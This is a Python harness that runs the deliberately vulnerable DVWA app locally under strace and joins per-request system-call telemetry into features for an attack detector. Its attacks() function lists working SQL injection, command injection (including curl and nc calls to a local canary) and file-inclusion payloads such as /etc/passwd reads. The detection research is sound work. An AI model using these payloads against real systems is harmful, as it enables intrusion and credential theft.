"""Request, process, network and file telemetry from a live DVWA, joined per request.

DVWA (Damn Vulnerable Web Application) is cloned at a pinned commit and run
on PHP's built-in server, single-threaded, at its "low" security level, with
a disposable MariaDB, bound to 127.0.0.1 only. The server runs under strace,
which records every program it starts (execve), every connection it opens
(connect) and every file it opens (openat), with wall-clock timestamps.

Because the server handles one request at a time and the client sends one
request at a time, every system call between a request being sent and its
response arriving belongs to that request. That join is the correlation:
one row per request, carrying what was asked, what the server ran, where it
connected and what it read.

Ground truth comes from outside the telemetry: the generator knows which
requests are attacks, and whether an attack succeeded is decided from the
response content or from a canary listener the attack must reach, never from
the strace record the detector reads.
"""
from __future__ import annotations

import http.cookiejar
import math
import os
import random
import re
import shutil
import socket
import subprocess
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from bisect import bisect_right
from dataclasses import dataclass, field
from pathlib import Path

DVWA_REPO = "https://github.com/digininja/DVWA"
DVWA_COMMIT = "502ac150ce37c20ca6e04cab7c5ca959f315f2d0"
TRACED = "execve,connect,openat"


# ------------------------------------------------------------------ server

def clone_dvwa(dest: Path) -> str:
    subprocess.run(["git", "clone", "-q", DVWA_REPO, str(dest)], check=True)
    subprocess.run(["git", "-C", str(dest), "checkout", "-q", DVWA_COMMIT], check=True)
    head = subprocess.run(["git", "-C", str(dest), "rev-parse", "HEAD"], capture_output=True, text=True,
                          check=True).stdout.strip()
    if head != DVWA_COMMIT:
        raise RuntimeError("DVWA checkout is not the pinned commit")
    shutil.copyfile(dest / "config" / "config.inc.php.dist", dest / "config" / "config.inc.php")
    return head


@dataclass
class Exchange:
    kind: str              # benign | attack
    family: str            # page family for benign, attack family for attacks
    method: str
    path: str
    params: dict
    t_send: float = 0.0
    t_recv: float = 0.0
    status: int = 0
    body: str = ""
    success: bool | None = None   # attacks only, from the oracle
    token: str = ""


class TracedDvwa:
    def __init__(self, docroot: Path, port: int, trace_file: Path, db_host: str = "127.0.0.1", db_port: int = 3306):
        env = {k: v for k, v in os.environ.items() if k != "PHP_CLI_SERVER_WORKERS"}
        env.update(DB_SERVER=db_host, DB_PORT=str(db_port), DISABLE_AUTHENTICATION="true",
                   DEFAULT_SECURITY_LEVEL="low")
        self.base = f"http://127.0.0.1:{port}"
        self.docroot = docroot
        self.trace_file = trace_file
        self.process = subprocess.Popen(
            ["strace", "-f", "-ttt", "-qq", "-s", "256", "-e", f"trace={TRACED}", "-o", str(trace_file),
             "php", "-d", "opcache.enable=0", "-d", "opcache.enable_cli=0", "-S", f"127.0.0.1:{port}",
             "-t", str(docroot)], env=env, cwd=str(docroot), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
        for _ in range(100):
            try:
                self.opener.open(self.base + "/setup.php", timeout=2).read()
                break
            except OSError:
                time.sleep(0.2)
        else:
            raise RuntimeError("DVWA did not start")

    def setup_database(self) -> None:
        page = self.opener.open(self.base + "/setup.php").read().decode()
        token = re.search(r"name='user_token' value='([0-9a-f]+)'", page).group(1)
        body = urllib.parse.urlencode({"create_db": "Create / Reset Database", "user_token": token}).encode()
        if "Setup successful" not in self.opener.open(self.base + "/setup.php", data=body).read().decode():
            raise RuntimeError("DVWA database setup did not report success")

    def send(self, ex: Exchange) -> Exchange:
        q = urllib.parse.urlencode(ex.params)
        if ex.method == "GET":
            req = urllib.request.Request(self.base + ex.path + ("?" + q if q else ""))
        else:
            req = urllib.request.Request(self.base + ex.path, data=q.encode())
        time.sleep(0.02)
        ex.t_send = time.time()
        try:
            resp = self.opener.open(req, timeout=60)
            ex.status, raw = resp.status, resp.read()
        except urllib.error.HTTPError as e:
            ex.status, raw = e.code, e.read()
        ex.t_recv = time.time()
        ex.body = raw.decode(errors="replace")
        time.sleep(0.02)
        return ex

    def stop(self) -> None:
        # Stop PHP first; strace then exits on its own and flushes the trace.
        subprocess.run(["pkill", "-f", "--", f"-S 127.0.0.1:{self.base.rsplit(':', 1)[1]}"], check=False)
        try:
            self.process.wait(timeout=15)
        except subprocess.TimeoutExpired:
            self.process.kill()
            self.process.wait(timeout=5)


class Canary:
    """A TCP listener an exfiltration payload must reach; records what it receives."""

    def __init__(self) -> None:
        self.sock = socket.socket()
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("127.0.0.1", 0))
        self.sock.listen(16)
        self.port = self.sock.getsockname()[1]
        self.received: list[bytes] = []
        self._stop = False
        threading.Thread(target=self._run, daemon=True).start()

    def _run(self) -> None:
        self.sock.settimeout(0.5)
        while not self._stop:
            try:
                conn, _ = self.sock.accept()
            except OSError:
                continue
            conn.settimeout(2)
            data = b""
            try:
                while len(data) < 4096:
                    chunk = conn.recv(1024)
                    if not chunk:
                        break
                    data += chunk
                    if b"\r\n\r\n" in data or b"\n" in data:
                        break
                if data.startswith(b"GET"):
                    conn.sendall(b"HTTP/1.0 200 OK\r\nContent-Length: 2\r\n\r\nok")
            except OSError:
                pass
            finally:
                conn.close()
            self.received.append(data)

    def saw(self, token: str) -> bool:
        return any(token.encode() in d for d in self.received)

    def stop(self) -> None:
        self._stop = True
        self.sock.close()


# ------------------------------------------------------------------ traffic

FIRST_NAMES = ("Ann", "O'Brien", "Anne-Marie", "José", "Smith & Sons", "Lee", "Zoë", "D'Angelo", "Mary Jane",
               "Nguyen", "Ahmed", "Ólafur", "J. R.", "50% off", "Kamau")
USERS = ("admin", "gordonb", "1337", "pablo", "smithy", "alice", "bob")
STATIC = ("/index.php", "/about.php", "/instructions.php", "/security.php", "/phpinfo.php")
PING_TARGETS = ("127.0.0.1", "localhost", "127.0.0.2", "::1", "127.0.0.1 ")
FI_PAGES = ("include.php", "file1.php", "file2.php", "file3.php")
BENIGN_WEIGHTS = (("sqli", 30), ("exec", 8), ("fi", 15), ("xss", 15), ("brute", 12), ("static", 20))


def benign(rng: random.Random) -> Exchange:
    fam = rng.choices([f for f, _ in BENIGN_WEIGHTS], [w for _, w in BENIGN_WEIGHTS])[0]
    if fam == "sqli":
        r = rng.random()
        v = str(rng.randint(1, 5)) if r < 0.6 else str(rng.randint(6, 300)) if r < 0.85 else rng.choice(
            ("abc", "", " 3", "01", "2 "))
        return Exchange("benign", fam, "GET", "/vulnerabilities/sqli/", {"id": v, "Submit": "Submit"})
    if fam == "exec":
        return Exchange("benign", fam, "POST", "/vulnerabilities/exec/", {"ip": rng.choice(PING_TARGETS),
                                                                          "Submit": "Submit"})
    if fam == "fi":
        return Exchange("benign", fam, "GET", "/vulnerabilities/fi/", {"page": rng.choice(FI_PAGES)})
    if fam == "xss":
        return Exchange("benign", fam, "GET", "/vulnerabilities/xss_r/", {"name": rng.choice(FIRST_NAMES)})
    if fam == "brute":
        pw = "password" if rng.random() < 0.3 else rng.choice(("letmein", "abc123", "Password1", "hunter2!", ""))
        return Exchange("benign", fam, "GET", "/vulnerabilities/brute/",
                        {"username": rng.choice(USERS), "password": pw, "Login": "Login"})
    return Exchange("benign", "static", "GET", rng.choice(STATIC), {})


def attacks(rng: random.Random, canary_port: int, per_family: int) -> list[Exchange]:
    """Attack attempts in four families. None of them appears in development traffic."""
    out: list[Exchange] = []
    for i in range(per_family):
        n = rng.randint(1, 5)
        sqli = rng.choice((f"{n}' OR '1'='1", f"{n}' or 1=1#", "x' OR 'a'='a",
                           f"{n}' UNION SELECT user, password FROM users#", "' UNION SELECT database(), version()#",
                           f"{n}' UNION SELECT table_name, table_schema FROM information_schema.tables#",
                           f"{n}' AND 1=1#", f"{n}''"))
        out.append(Exchange("attack", "sqli", "GET", "/vulnerabilities/sqli/", {"id": sqli, "Submit": "Submit"}))

        tok = f"ps{rng.randrange(16**8):08x}"
        cmd = rng.choice((("127.0.0.1; id", ""), ("127.0.0.1 && cat /etc/passwd", ""), ("127.0.0.1 | uname -a", ""),
                          ("; whoami", ""), (f"127.0.0.1; curl -s http://127.0.0.1:{canary_port}/{tok}", tok),
                          (f"127.0.0.1; echo {tok} | nc -w 1 127.0.0.1 {canary_port}", tok),
                          ("127.0.0.1; ls -la /", ""), ("127.0.0.1; nosuchcommand_ps", "")))
        out.append(Exchange("attack", "cmdi", "POST", "/vulnerabilities/exec/", {"ip": cmd[0], "Submit": "Submit"},
                            token=cmd[1]))

        lfi = rng.choice(("../../../../../../etc/passwd", "/etc/passwd", "/etc/hostname", "/etc/os-release",
                          "php://filter/convert.base64-encode/resource=index.php", "/proc/self/environ",
                          "....//....//etc/passwd", "/etc/nonexistent_ps"))
        out.append(Exchange("attack", "lfi", "GET", "/vulnerabilities/fi/", {"page": lfi}))

        login = rng.choice(("admin' #", "admin'-- ", "x' OR '1'='1' #", "' OR 1=1 LIMIT 1#", "gordonb' #",
                            "admin' AND 1=2#"))
        out.append(Exchange("attack", "sqli_login", "GET", "/vulnerabilities/brute/",
                            {"username": login, "password": "wrong", "Login": "Login"}))
    return out


# ------------------------------------------------------------------ oracle

SQLI_ROW = re.compile(r"First name: ([^<]*)<br />Surname: ([^<]*)</pre>")
LEGIT_ROWS: dict[str, set] = {}


def legit_rows(server: TracedDvwa) -> dict[str, set]:
    """Rows a legitimate lookup of each leading id returns (read before any attack)."""
    out = {}
    for n in ("1", "2", "3", "4", "5", ""):
        ex = server.send(Exchange("oracle", "oracle", "GET", "/vulnerabilities/sqli/", {"id": n, "Submit": "Submit"}))
        out[n] = set(SQLI_ROW.findall(ex.body))
    return out


def judge(ex: Exchange, legit: dict[str, set], canary: Canary, host_facts: dict) -> bool:
    """Whether an attack achieved something a legitimate request could not."""
    if ex.family == "sqli":
        lead = re.match(r"\d+", ex.params["id"])
        allowed = legit.get(lead.group(0) if lead else "", set())
        return any(r not in allowed for r in SQLI_ROW.findall(ex.body))
    if ex.family == "cmdi":
        if ex.token:
            return canary.saw(ex.token)
        b = ex.body
        return ("uid=" in b or "root:x:0:0" in b or host_facts["uname"] in b
                or re.search(r"<pre>(?:[^<]*\n)?" + re.escape(host_facts["user"]) + r"\n", b) is not None
                or "drwx" in b)
    if ex.family == "lfi":
        b = ex.body
        return ("root:x:0:0" in b or host_facts["hostname"] in b.split("<", 1)[0]
                or "PRETTY_NAME" in b or "PD9waHA" in b or "PATH=" in b)
    if ex.family == "sqli_login":
        return "Welcome to the password protected area" in ex.body
    raise ValueError(ex.family)


def host_facts() -> dict:
    return {"uname": os.uname().sysname + " " + os.uname().nodename, "user": __import__("getpass").getuser(),
            "hostname": socket.gethostname()}


# ------------------------------------------------------------------ strace

LINE = re.compile(r"^(\d+)\s+(\d+\.\d+)\s+(.*)$")
CALL = re.compile(r"^(execve|connect|openat)\((.*)$")
RESUMED = re.compile(r"^<\.\.\. (execve|connect|openat) resumed>(.*)$")
RESULT = re.compile(r"\)\s+=\s+(-?\d+)")


@dataclass
class Syscall:
    t: float
    pid: int
    call: str
    arg: str
    ok: bool


def _arg(call: str, rest: str) -> str:
    if call == "execve":
        m = re.match(r'"([^"]*)"', rest)
        return m.group(1) if m else ""
    if call == "openat":
        m = re.search(r'"([^"]*)"', rest)
        return m.group(1) if m else ""
    if "AF_UNIX" in rest:
        m = re.search(r'sun_path="([^"]*)"', rest)
        return "unix:" + (m.group(1) if m else "")
    port = re.search(r"htons\((\d+)\)", rest)
    addr = re.search(r'inet_(?:addr|pton)\((?:AF_INET6, )?"([^"]*)"', rest)
    fam = "inet6" if "AF_INET6" in rest else "inet" if "AF_INET" in rest else "other"
    return f"{fam}:{addr.group(1) if addr else '?'}:{port.group(1) if port else '?'}"


def parse_strace(text: str) -> list[Syscall]:
    out: list[Syscall] = []
    pending: dict[tuple[int, str], int] = {}
    for line in text.splitlines():
        m = LINE.match(line)
        if not m:
            continue
        pid, t, rest = int(m.group(1)), float(m.group(2)), m.group(3)
        r = RESUMED.match(rest)
        if r:
            idx = pending.pop((pid, r.group(1)), None)
            res = RESULT.search(r.group(2))
            if idx is not None and res:
                out[idx].ok = int(res.group(1)) >= 0
            continue
        c = CALL.match(rest)
        if not c:
            continue
        call = c.group(1)
        sc = Syscall(t, pid, call, _arg(call, c.group(2)), True)
        if "<unfinished ...>" in rest:
            pending[(pid, call)] = len(out)
        else:
            res = RESULT.search(rest)
            sc.ok = bool(res) and int(res.group(1)) >= 0
            if call == "connect" and "EINPROGRESS" in rest:
                sc.ok = True
        out.append(sc)
    return out


def attribute(exchanges: list[Exchange], calls: list[Syscall]) -> list[list[Syscall]]:
    """Calls made between each request's send and its response."""
    starts = [e.t_send for e in exchanges]
    per: list[list[Syscall]] = [[] for _ in exchanges]
    for c in calls:
        i = bisect_right(starts, c.t) - 1
        if i >= 0 and c.t <= exchanges[i].t_recv:
            per[i].append(c)
    return per


# ------------------------------------------------------------------ features

def norm_path(path: str, docroot: str) -> str:
    """A file path with run-specific parts (docroot, process ids, session ids) replaced."""
    p = path.replace(docroot, "<docroot>", 1)
    p = re.sub(r"/\d+(?=/|$)", "/N", p)
    return re.sub(r"sess_[0-9a-zA-Z]+", "sess_X", p)


@dataclass
class Vocab:
    paths: list[str] = field(default_factory=list)
    exes: set = field(default_factory=set)
    endpoints: set = field(default_factory=set)
    files: set = field(default_factory=set)
    chars: set = field(default_factory=set)

    def to_json(self) -> dict:
        return {"paths": self.paths, "exes": sorted(self.exes), "endpoints": sorted(self.endpoints),
                "files": sorted(self.files), "chars": sorted(self.chars)}

    @classmethod
    def from_json(cls, d: dict) -> "Vocab":
        return cls(list(d["paths"]), set(d["exes"]), set(d["endpoints"]), set(d["files"]), set(d["chars"]))


def build_vocab(exchanges: list[Exchange], per: list[list[Syscall]], docroot: str) -> Vocab:
    v = Vocab(paths=sorted({e.path for e in exchanges}))
    for e, calls in zip(exchanges, per):
        v.chars |= {ch for val in e.params.values() for ch in str(val) if not ch.isalnum()}
        for c in calls:
            if not c.ok:
                continue
            if c.call == "execve":
                v.exes.add(os.path.basename(c.arg))
            elif c.call == "connect":
                v.endpoints.add(c.arg)
            else:
                v.files.add(norm_path(c.arg, docroot))
    return v


REQUEST_FEATURES = ("post", "n_params", "log_value_len", "n_symbol_chars", "n_distinct_symbols",
                    "n_unseen_symbols", "status", "log_body_len", "log_latency_ms")
PROCESS_FEATURES = ("n_exec", "n_distinct_exe", "n_unseen_exe", "n_exec_failed")
NETWORK_FEATURES = ("n_connect", "n_distinct_endpoints", "n_unseen_endpoints", "n_connect_failed")
FILE_FEATURES = ("log_n_open", "n_distinct_files", "n_unseen_files", "log_n_open_failed")


def features(e: Exchange, calls: list[Syscall], v: Vocab, docroot: str) -> dict[str, list[float]]:
    vals = [str(x) for x in e.params.values()]
    syms = [ch for val in vals for ch in val if not ch.isalnum()]
    onehot = [float(e.path == p) for p in v.paths] + [float(e.path not in v.paths)]
    request = [float(e.method == "POST"), float(len(e.params)), math.log1p(sum(len(x) for x in vals)),
               float(len(syms)), float(len(set(syms))), float(len(set(syms) - v.chars)), float(e.status),
               math.log1p(len(e.body)), math.log1p(max(0.0, (e.t_recv - e.t_send) * 1000))] + onehot
    ex = [c for c in calls if c.call == "execve"]
    exe_ok = [os.path.basename(c.arg) for c in ex if c.ok]
    process = [float(len(exe_ok)), float(len(set(exe_ok))), float(len(set(exe_ok) - v.exes)),
               float(sum(1 for c in ex if not c.ok))]
    co = [c for c in calls if c.call == "connect"]
    ends = [c.arg for c in co]
    network = [float(len(co)), float(len(set(ends))), float(len(set(ends) - v.endpoints)),
               float(sum(1 for c in co if not c.ok))]
    op = [c for c in calls if c.call == "openat"]
    opened = {norm_path(c.arg, docroot) for c in op if c.ok}
    files = [math.log1p(sum(1 for c in op if c.ok)), float(len(opened)), float(len(opened - v.files)),
             math.log1p(sum(1 for c in op if not c.ok))]
    return {"request": request, "process": process, "network": network, "file": files,
            "correlated": request + process + network + files}
